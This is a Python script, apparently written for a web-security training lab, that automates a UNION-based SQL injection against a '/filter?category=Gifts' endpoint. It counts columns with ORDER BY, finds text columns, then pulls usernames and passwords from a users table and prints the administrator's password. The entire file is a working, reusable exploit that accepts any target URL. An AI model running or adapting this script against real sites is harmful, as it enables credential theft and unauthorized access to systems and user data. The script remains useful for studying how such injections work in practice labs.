import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exploit_sqli_column_number(url):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False


            
def exploit_sqli_string_fields(url, num_col):
    path = "/filter?category=Gifts"
    for i in range(1, num_col+1):
        string = "'lTsB95'"
        payload_list = ['null'] * num_col
        payload_list[i-1] = string
        sql_payload = "' union select " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sql_payload, verify=False)
        res = r.text
        if string.strip('\'') in res:
            print("[+] The column that contains text is -->  " + str(i) + ".")
        else:
            print("[-] We were not able to find for column --> " + str(i) )
    

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select NULL, username || '*' || password from users--"
    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password...")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(string=re.compile('.*administrator.*')).split("*")[1]
        print("[+] The administrator password is '%s'." % admin_password)
        return True
    return False


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("[+] Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    
    if num_col:
        print("[+] The number of columns is " + str(num_col))
        print("[+] Figuring out which columns that hold text...")
        exploit_sqli_string_fields(url, num_col)
        #print("[+] Figuring out the table name that contains usernames and passwords...")
        #exploit_sqli_table_name(url)
        print("[+] Figuring out the administrator password...")
        
        if  not exploit_sqli_users_table(url):
            print("[-]     (*_*) XX (*_*) XX (*_*) ")
            print("[-] Sorry, could not find the administrator password.")
    else:
        print("[-]     (*_*) XX (*_*) XX (*_*) ")
        print("[-] The SQLi attack was not successful.")
        print("[-] Sorry, could not find the number of columns.")
        
        

        
        